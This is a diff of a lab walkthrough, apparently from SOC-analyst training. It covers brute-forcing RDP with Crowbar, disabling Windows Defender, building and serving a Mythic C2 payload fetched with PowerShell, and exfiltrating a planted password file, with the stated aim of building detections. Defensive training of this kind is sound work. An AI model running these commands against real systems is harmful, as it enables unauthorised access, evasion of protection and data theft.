@@ -19,6 +19,7 @@
 
 1. Create a fake file named `passwords.txt` in the Documents folder.
 2. Change the password to `Winter2024!`:
+
     - Go to Start Menu > Username > Change Account Settings > Sign-in Options > Password > Change.
     - Enter current password, then set new password to `Winter2024!`.
     - If password policy requirements are not met, adjust settings in Local Group Policy Editor:
@@ -42,8 +43,9 @@ sudo gunzip rockyou.txt.gz
 Extract first 50 entries and add `Winter2024!` to the list.
 
 ```
-cat rockyou.txt >>
+head -n50 cat rockyou.txt > /home/user/Desktop/Challenge-Wordlist.txt
 ```
+
 
 1. **Install and use Crowbar for Brute Force attack:**
 
@@ -66,18 +68,31 @@ Create target file with Windows server IP and username.
 
 **Steps**:
 
-1. **Perform Brute Force Attack**:
-    
-    - Use Crowbar to authenticate with the target IP address using CIDR notation.
-    - Command: `crowbar -b rdp -u administrator -C /path/to/wordlist -s <target_ip> -n 32`
-    - Successful RDP login with username `administrator` and password `Winter2024!`.
-2. **Connect via RDP**:
-    
-    - Use `xfreerdp` to connect to the Windows server.
-    - Command: `xfreerdp /u:administrator /p:Winter2024! /v:<target_ip>:3389`
-    - Trust the certificate and establish RDP connection.
+**Perform Brute Force Attack**:
+   
+Use Crowbar to authenticate with the target IP address using CIDR notation.
+
+```
+crowbar -b rdp -u administrator -C Challenge-Wordlist.txt -s <Challenge-WIN-Haji-IP>/32
+```
+
+Successful RDP login with username `Administrator` and password `Winter2024!`.
+
+**Connect via RDP**:
+
+Use `xfreerdp` to connect to the Windows server.
+
+Command: 
+
+```
+xfreerdp /u:Administrator /p:Winter2024! /v:<Challenge-WIN-Haji-IP>:3389
+```
+
+Trust the certificate and establish RDP connection.
 
 ## 6. Discovery Commands
+
+In RDP session open commands prompt/powershell and runs these commands to discover more about the target.
 
 **Commands**:
 
@@ -85,13 +100,11 @@ Create target file with Windows server IP and username.
 2. **IP Configuration**: `ipconfig`
 3. **Net User**: `net user`
 4. **Net Group**: `net group`
-5. **Net User (Specific User)**: `net user <username>`
+5. **Net User (Specific User)**: `net user Administartor`
 
 ## 7. Defense Evasion
 
-**Steps**:
-
-1. **Disable Windows Defender**:
+**Disable Windows Defender**:
     - Open Windows Security settings.
     - Disable Real-time protection and other security features.
 
@@ -99,82 +112,126 @@ Create target file with Windows server IP and username.
 
 **Steps**:
 
-1. **Build Mythic Agent**:
-    
-    - Access Mythic web GUI and SSH session.
-    - Install Apollo agent:
-        - Command: `mythic-cli install github https://github.com/MythicAgents/Apollo`
-    - Install HTTP C2 profile:
-        - Command: `mythic-cli install github https://github.com/MythicC2Profiles/http`
-2. **Create Payload**:
-    
-    - Generate new payload in Mythic web GUI.
-    - Select target machine (Windows) and output format (Windows executable).
-    - Include all available commands and set callback host to Mythic server IP.
-    - Set callback interval and port.
-    - Name the payload with your username and description.
+**1. Build Mythic Agent**:
+   
+ Access Mythic web GUI and SSH session.
+ 
+ In*stall Apollo agent:*
+ 
+ Command: 
+ 
+```
+./mythic-cli install github https://github.com/MythicAgents/Apollo
+```
+
+*Install HTTP C2 profile:*
+
+Command: 
+
+```
+./mythic-cli install github https://github.com/MythicC2Profiles/http
+```
+
+**2. Create Payload**:
+
+- Generate new payload in Mythic web GUI.
+- Select target machine (Windows) and output format (Windows Executable).
+- Include all available commands and set callback host to Mythic server IP in format `http://<Challenge-Mythic-IP>`
+- Set port `80` and leave everything else as default.
+- Name the payload `ChallengeMythicPayload`
 
 ## 9. Downloading and Executing the Payload
 
 **Steps**:
 
-1. **Download Payload**:
-    
-    - Copy the download link address from Mythic web GUI.
-    - Use `wget` with `--no-check-certificate` to download the payload on the Mythic server.
-    - Rename the downloaded file to `servicehost-stevenrocks.exe`.
-2. **Serve Payload via HTTP**:
-    
-    - Create a directory and move the payload into it.
-    - Use Python's HTTP server module to serve the payload on port 9999.
-    - Command: `python3 -m http.server 9999`.
-3. **Download Payload on Windows Server**:
-    
-    - Use PowerShell to download the payload from the Mythic server.
-    - Command: `Invoke-WebRequest -Uri http://<Mythic_IP>:9999/servicehost-stevenrocks.exe -OutFile C:\Users\Public\Downloads\servicehost-stevenrocks.exe`.
-4. **Execute Payload**:
-    
-    - Run the downloaded payload on the Windows server.
-    - Verify the connection using `netstat` and Task Manager.
+**1. Download Payload**:
+   
+Copy the download link address from Mythic web GUI.
+Use `wget` with `--no-check-certificate` to download the payload on the Mythic server.
+Rename the downloaded file to `servicehost-haji.exe`.
+
+**2. Serve Payload via HTTP**:
+   
+Create a directory and move the payload into it.
+Allow port 9999 on `Challenge-Mythic` using
+
+```
+ufw allow 9999
+```
+
+Use Python's HTTP server module to serve the payload on port 9999.
+Command: 
+
+```
+python3 -m http.server 9999
+```
+
+
+**Download Payload on Windows Server**:
+
+Use PowerShell to download the payload from the Mythic server.
+
+Command:
+
+```
+Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/servicehost-haji.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe
+```
+
+**Execute Payload**:
+
+Allow the port `80` communication on `Challenge-Mythic` Server using
+
+```
+ufw allow port 80
+```
+  
+Run the downloaded payload on the Windows server.
+
+Verify the connection using `netstat` to confirm connection is established and also see in Task Manager.
+
+
+```
+netstat -anob
+```
+
+*If you did not find anything in netstat or Task Manger, navigate to call back in Mythic Web GUI and confirm there.*
 
 ## 10. Establishing C2 Connection
 
 **Steps**:
 
-1. **Allow Necessary Ports**:
-    
-    - Ensure UFW firewall allows ports 9999 and 80.
-2. **Verify Connection**:
-    
-    - Check for established connection using `netstat`.
-    - Confirm process ID in Task Manager.
-3. **Interact with Active Callback**:
-    
-    - Use Mythic web GUI to interact with the active callback.
-    - Run commands like `whoami` and `ipconfig` to verify the connection.
+**Interact with Active Callback**:
+   
+Use Mythic web GUI to interact with the active callback.
+Run commands like `whoami` and `ifconfig` to verify the connection.
 
 ## 11. Exfiltration
 
 **Steps**:
 
-1. **Download Fake Password File**:
-    
-    - Use Mythic's download command to retrieve the `passwords.txt` file.
-    - Command: `download C:\Users\Administrator\Documents\passwords.txt`.
-2. **Verify Download**:
-    
-    - Check the downloaded file in Mythic web GUI.
-    - Confirm the contents of the file.
+**Download Fake Password File**:
+
+Use Mythic's download command to retrieve the `passwords.txt` file.
+
+Command:
+
+```
+download C:\Users\Administrator\Documents\passwords.txt
+```
+
+**Verify Download**:
+
+Check the downloaded file in Mythic web GUI.
+Confirm the contents of the file.
 
 ## 12. Conclusion
 
 **Summary**:
 
-- Successfully performed a Brute Force attack and established a C2 session.
-- Downloaded and executed a payload on the Windows server.
-- Retrieved a fake password file using the established C2 connection.
+Successfully performed a Brute Force attack and established a C2 session.
+Downloaded and executed a payload on the Windows server.
+Retrieved a fake password file using the established C2 connection.
 
 **Next Steps**:
 
-- Create alerts and dashboards to detect Mythic activity.
-- Participate in the giveaway for a chance to win a free Vulture for the MyDFIR SH Analyst course and TryHackMe passes.
+Create alerts and dashboards to detect Mythic activity.
